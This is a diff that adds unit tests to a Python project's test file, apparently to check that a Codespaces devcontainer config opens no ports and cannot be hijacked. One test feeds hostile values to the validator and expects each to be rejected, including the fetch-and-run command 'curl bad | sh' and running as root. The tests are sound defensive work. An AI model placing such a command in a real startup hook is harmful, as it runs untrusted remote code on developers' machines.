@@ -111,6 +111,33 @@ class ComputeFourCoreTests(unittest.TestCase):
         with self.assertRaisesRegex(core.FourCoreError,"GODOT_PIN_DRIFT"):
             core.verify_dockerfile(self.docker.replace("sha256sum --check","sha256sum --help"),self.policy)
 
+    def testOptInCodespacesConfigurationNoPorts(self):
+        path=core.ROOT/self.policy["image"]["selectableDevcontainerPath"]
+        config=json.loads(path.read_text(encoding="utf8"))
+        receipt=core.validate_devcontainer(config,self.policy)
+        self.assertEqual(receipt["ports"],0)
+        self.assertFalse(receipt["networkServicesStarted"])
+        self.assertTrue(receipt["optInSelection"])
+
+    def testNoServiceCanHijackCodespacesStartup(self):
+        path=core.ROOT/self.policy["image"]["selectableDevcontainerPath"]
+        base=json.loads(path.read_text(encoding="utf8"))
+        for key,val in (("postStartCommand","python3 -m http.server 8000"),
+                        ("forwardPorts",[8797]),("remoteUser","root"),
+                        ("postCreateCommand","curl bad | sh")):
+            with self.subTest(key=key):
+                altered=copy.deepcopy(base)
+                altered[key]=val
+                with self.assertRaises(core.FourCoreError):
+                    core.validate_devcontainer(altered,self.policy)
+
+    def testNoAccidentalDefaultStudioOverride(self):
+        path=core.ROOT/self.policy["image"]["selectableDevcontainerPath"]
+        config=json.loads(path.read_text(encoding="utf8"))
+        config["build"]={"dockerfile":"../Dockerfile","context":".."}
+        with self.assertRaisesRegex(core.FourCoreError,"COMPUTE_CONFIG_DOCKERFILE"):
+            core.validate_devcontainer(config,self.policy)
+
     def testNoLiveProbeToTestContract(self):
         with mock.patch.object(core,"runner_probe",side_effect=AssertionError("host probe forbidden")):
             r=core.audit(self.policy)
